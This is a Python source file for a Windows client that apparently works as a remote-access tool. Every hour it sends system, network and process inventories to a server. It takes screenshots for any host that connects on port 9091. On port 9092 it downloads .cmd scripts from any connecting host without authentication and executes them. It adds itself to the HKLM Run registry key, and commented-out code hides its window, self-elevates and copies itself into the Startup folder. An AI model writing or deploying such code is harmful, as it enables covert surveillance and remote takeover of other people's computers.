import psutil
import json
import socket
from socket import AF_INET, SOCK_STREAM, SOCK_DGRAM
import datetime
import time
import os
import sys
import mss
import threading
import subprocess
import configparser
import winreg
import time
# import win32gui
# import ctypes, win32com.shell.shell, win32event, win32process

config = configparser.ConfigParser()
if not config.read('client_config.ini'):
    config = configparser.RawConfigParser()
    config.add_section('CLIENT')
    config.set('CLIENT', 'JSON_FILE_SAVE_DEST' , 'client_json//')
    config.set('CLIENT', 'SCREENSHOT_DEST' , 'client_screenshot//')
    config.set('CLIENT', 'SCRIPTS_DEST' , 'client_script//')
    config.set('CLIENT', 'SERVER_ADDRESS' , 'localhost')
    config.set('CLIENT', 'SEND_TIMER_DELAY' , '3600.0')
    with open('client_config.ini', 'w') as configfile:
        config.write(configfile)
    configfile.close()

DEFAULTS = config['CLIENT']

JSON_FILE_SAVE_DEST = DEFAULTS['JSON_FILE_SAVE_DEST']
SCREENSHOT_DEST = DEFAULTS['SCREENSHOT_DEST']
SCRIPTS_DEST = DEFAULTS['SCRIPTS_DEST']
SERVER_ADDRESS = DEFAULTS['SERVER_ADDRESS']
SEND_TIMER_DELAY = float(DEFAULTS['SEND_TIMER_DELAY'])

AF_INET6 = getattr(socket, 'AF_INET6', object())

af_map = {
    socket.AF_INET: 'IPv4',
    socket.AF_INET6: 'IPv6',
    psutil.AF_LINK: 'MAC',
}

duplex_map = {
    psutil.NIC_DUPLEX_FULL: "full",
    psutil.NIC_DUPLEX_HALF: "half",
    psutil.NIC_DUPLEX_UNKNOWN: "?",
}

proto_map = {
    (AF_INET, SOCK_STREAM): 'tcp',
    (AF_INET6, SOCK_STREAM): 'tcp6',
    (AF_INET, SOCK_DGRAM): 'udp',
    (AF_INET6, SOCK_DGRAM): 'udp6',
}

def bytes_to_human(number):
    symbols = ('K', 'M', 'G', 'T', 'P', 'E', 'Z', 'Y')
    prefix = {}
    for i, s in enumerate(symbols):
        prefix[s] = 1 << (i + 1) * 10
    for s in reversed(symbols):
        if number >= prefix[s]:
            value = float(number) / prefix[s]
            return '%.2f %s' % (value, s)
    return '%.2f B' % (number)

def get_time_str():
    time_stamp = time.time()
    return datetime.datetime.fromtimestamp(time_stamp).strftime('%Y-%m-%d_%H-%M-%S')

def get_screenshot():
    with mss.mss() as sct:
        time_stamp_name = get_time_str()
        filename = sct.shot(mon = -1, output = SCREENSHOT_DEST + time_stamp_name + '.png')
        return time_stamp_name

def create_dict(not_dict):
    dict = {}
    for name in not_dict._fields:
        value = getattr(not_dict, name)
        dict.update({ name.capitalize() : value })
    return dict

def get_whole_info():
    whole_dict = {}
    
    #----------Cpu persentage usage----------
    whole_dict.update({ 'Cpu percent usage': psutil.cpu_percent(interval=1, percpu=True)})
    
    #----------memory use----------
    dict1 = {}
    nt = psutil.virtual_memory()
    for name in nt._fields:
        value = getattr(nt, name)
        if name != 'percent':
            value = bytes_to_human(value)
        dict1.update({ name.capitalize() : value })
    whole_dict.update({ 'Virtual memory' : dict1 })

    #----------Disk usage----------
    # ????????????????????????????????????????
    # dict1 = {}
    # dict2 = {}
    # for device in psutil.disk_partitions():
        # if os.name == 'nt':
            # if 'cdrom' in device.opts or device.fstype == '':
                # continue
        # usage = psutil.disk_usage(device.mountpoint)
        # dict1 = {
                       # 'Total' : bytes_to_human(usage.total),
                       # 'Used' : bytes_to_human(usage.used),
                       # 'Free' : bytes_to_human(usage.free),
                       # 'Use' : str(usage.percent) + ' %',
                       # 'File system type' : device.fstype,
                       # 'Mountpoint' : device.mountpoint }
        # dict2.update({ 'Device: ' + device.device : dict1 })
    # whole_dict.update({ 'Disk_partitions' : dict2 })

    #----------Net stats----------
    dict1 = {}
    dict2 = {}
    dict3 = {}

    stats = psutil.net_if_stats()
    io_counters = psutil.net_io_counters(pernic=True)
    for dev_name, addrs in psutil.net_if_addrs().items():
        dict1 = {}
        if dev_name in stats:
            stat = stats[dev_name]
            dict1.update({ 'Stats' : { 'Speed' : str(stat.speed) + ' Mb',
                                      'Duplex' : duplex_map[stat.duplex],
                                      'Mtu' : stat.mtu,
                                      'Is up' : 'yes' if stat.isup else 'no'}
                                      })
        if dev_name in io_counters:
            io_counter = io_counters[dev_name]
            dict1.update({ 'Incoimg' : { 'bytes' : bytes_to_human(io_counter.bytes_recv),
                                         'pkts' : io_counter.packets_recv,
                                         'errors' : io_counter.errin,
                                         'drops' : io_counter.dropin
                                        } })
            dict1.update({ 'Outgoing' : { 'bytes' : bytes_to_human(io_counter.bytes_sent),
                                          'pkts' : io_counter.packets_sent,
                                          'errors' : io_counter.errout,
                                          'drops' : io_counter.dropout
                                         } })
        for addr in addrs:
            dict2 = { 'address' : addr.address }
            if addr.broadcast:
                dict2.update({ 'broadcast' : addr.broadcast })
            if addr.netmask:
                dict2.update({ 'netmask' : addr.netmask })
            if addr.ptp:
                dict2.update({ 'p2p' : addr.ptp })
            dict1.update({ af_map.get(addr.family, addr.family) : dict2 })
        dict3.update({ dev_name : dict1 })
    whole_dict.update({ 'Net adapters' : dict3 })

    #----------Connetions----------
    # ????????????????????????????????????????
    # proc_names = {}
    # dict1 = {}
    # dict2 = {}
    # for p in psutil.process_iter(attrs=[ 'pid', 'name' ]):
        # proc_names.update({ p.info[ 'pid' ] : p.info[ 'name' ] }) 
    # connections = psutil.net_connections(kind = 'inet')
    # for c in connections:
        # laddr = '%s:%s' % (c.laddr)
        # raddr = 'NONE'
        # if c.raddr:
            # raddr = '%s:%s' % (c.raddr)
        # dict1 = ({ 'Proto' : proto_map[( c.family, c.type )],
                       # 'Local address' : laddr,
                       # 'Remote address' : raddr,
                       # 'Status' : c.status,
                       # 'PID' : c.pid,
                       # 'Programm name' : proc_names.get(c.pid, '?')[:15] 
                       # })
        # dict2['Connection ' + str(connections.index(c))] = dict1
    # whole_dict['Connetions'] = dict2

    # ----------Processes----------
    list = psutil.pids()
    dict1 = {}
    dict2 = {}
    for i in range(len(list)):
        p = psutil.Process(list[i])
        memory_info = create_dict(p.memory_info())
        dict1 = { 'Name' :  p.name() }
        dict1.update({ 'Pid' : p.pid })
        dict1.update({ 'Status' : p.status() })
        dict1.update({ 'Memory_info' : { 'Rss' : (bytes_to_human(memory_info['Rss']) or 'NONE'),
                                         'Vms' : (bytes_to_human(memory_info['Vms']) or 'NONE')
                                        } })
        dict2.update({ 'Process ' + str(i) : dict1 })
    whole_dict.update({ 'Processes' : dict2 })

    del dict1, dict2, dict3

    # print(json.dumps(whole_dict, indent = 4))
    
    time_stamp_name = get_time_str()
    with open(JSON_FILE_SAVE_DEST + time_stamp_name + '.json', 'w') as fp:
       json.dump(whole_dict, fp, indent=4, sort_keys=True)
    fp.close()
    return time_stamp_name

def json_send():
    threading.Timer(SEND_TIMER_DELAY, json_send).start()
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((SERVER_ADDRESS, 9090))
        print('\nConnected to ' + SERVER_ADDRESS)
        name = get_whole_info()
        size = os.path.getsize(JSON_FILE_SAVE_DEST + name + '.json')
        sock.send(str(size).encode())
        sock.recv(1)
        sock.send(name.encode())
        sock.recv(1)
        sock.send(open(JSON_FILE_SAVE_DEST + name + '.json','rb').read(size))
        sock.close()
    except Exception as error:
        print('JSON exchange error: %s\n' % str(error))
    else:
        print('JSON exchange success\n')

def screenshot_to_server():
    while True:
        try:
            serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            serversocket.bind(('', 9091))
            serversocket.listen(1)
            (connection, address) = serversocket.accept()
            print('\nServer connected\nip: ' + str(address[0]))
            name = get_screenshot()
            size = os.path.getsize(SCREENSHOT_DEST + name  + '.png')
            connection.send(str(size).encode())
            connection.recv(1)
            connection.send(name.encode())
            connection.recv(1)
            connection.send(open(SCREENSHOT_DEST + name + '.png','rb').read(size))
            connection.close()
        except Exception as error:
            print('Screenshot exchange error: %s\n' % str(error))
            connection.close()
        else:
            print('Screenshot exchange success\n')

def do_script():
    while True:
        try:
            serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            serversocket.bind(('', 9092))
            serversocket.listen(1)
            (connection, address) = serversocket.accept()
            print('Server connected - ', address[0])
            file_name = 'script_' + get_time_str() + '.cmd'
            file_size = connection.recv(16)
            connection.send(b'1')
            file_data = connection.recv(int(file_size.decode('utf-8')))
            file = open(SCRIPTS_DEST + file_name, 'wb')
            file.write(file_data)
            file.close()
            connection.close()
        except Exception as error:
            print('Script exchange error: %s\n' % str(error))
            connection.close()
        else:
            print('Script exchange success\n')
            subprocess.call(os.getcwd() + '//' + SCRIPTS_DEST + file_name, creationflags=subprocess.CREATE_NEW_CONSOLE)

def do_json():
    while True:
        try:
            serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            serversocket.bind(('', 9093))
            serversocket.listen(1)
            (connection, address) = serversocket.accept()
            name = get_whole_info()
            size = os.path.getsize(JSON_FILE_SAVE_DEST + name + '.json')
            connection.send(str(size).encode())
            connection.recv(1)
            connection.send(name.encode())
            connection.recv(1)
            connection.send(open(JSON_FILE_SAVE_DEST + name + '.json','rb').read(size))
            connection.close()
        except Exception as error:
            print('JSON exchange error: %s\n' % str(error))
            connection.close()
        else:
            print('JSON exchange success\n')

# def go_admin():
    # outpath = r'%s\%s.out' % (os.environ["TEMP"], sys.argv[0])
    # if ctypes.windll.shell32.IsUserAnAdmin():
        # if os.path.isfile(outpath):
            # sys.stderr = sys.stdout = open(outpath, 'wb', 0)
        # return
    # with open(outpath, 'wb+', 0) as outfile:
        # hProc = win32com.shell.shell.ShellExecuteEx(lpFile=sys.executable, lpVerb='runas', lpParameters=' '.join(sys.argv), fMask=64, nShow=0)['hProcess']
        # while True:
            # hr = win32event.WaitForSingleObject(hProc, 40)
            # while True:
                # line = outfile.readline()
                # if not line:
                    # break
                # sys.stdout.write(line)
            # if hr == 0x102:
                # break
    # os.remove(outpath)
    # sys.stderr = ''
    # sys.exit(win32process.GetExitCodeProcess(hProc))
    
def main():

    p = psutil.Process()

    # ----------HIDE WINDOW----------
    # def enumWindowFunc(hwnd, windowList):
        # text = win32gui.GetWindowText(hwnd)
        # className = win32gui.GetClassName(hwnd)
        # if text.find(p.name()) >= 0:
            # windowList.append((hwnd, text, className))
    # myWindows = []
    # win32gui.EnumWindows(enumWindowFunc, myWindows)
    # for hwnd, text, className in myWindows:
        # win32gui.ShowWindow(hwnd, False)

    # ----------CREATE DIRS----------
    if not os.path.exists(JSON_FILE_SAVE_DEST):
        os.makedirs(JSON_FILE_SAVE_DEST)
    if not os.path.exists(SCREENSHOT_DEST):
        os.makedirs(SCREENSHOT_DEST)
    if not os.path.exists(SCRIPTS_DEST):
        os.makedirs(SCRIPTS_DEST)

    # ----------ADD TO LOCALE----------
    myExe_path = os.path.abspath(sys.argv[0])
    subprocess.call(r'reg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersio‌​n\Run" /v "myfile" /t REG_SZ /f /d "%s"' % myExe_path)
    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, p.name(), 0, winreg.REG_SZ, myExe_path)
    key.Close()

    # ----------CREATE THREADS----------
    thread_1 = threading.Thread(name='json_send', target = json_send)
    thread_2 = threading.Thread(name='screenshot_to_server', target = screenshot_to_server)
    thread_3 = threading.Thread(name='do_script', target = do_script)
    thread_4 = threading.Thread(name='do_json', target = do_json)
    thread_1.start()
    thread_2.start()
    thread_3.start()
    thread_4.start()
    

if __name__ == "__main__":
    # go_admin()
    main()

# aup = os.environ.get("ALLUSERSPROFILE")
# up = os.environ.get("USERPROFILE")
# if aup and up:
  # os.rename(os.path.join(up,"Downloads","myfile.exe")),os.path.join(aup,"Start menu","Programs","startup","myfile.exe"))
# else:
    # print("Oops, couldn't look up stuff in os.environ")

































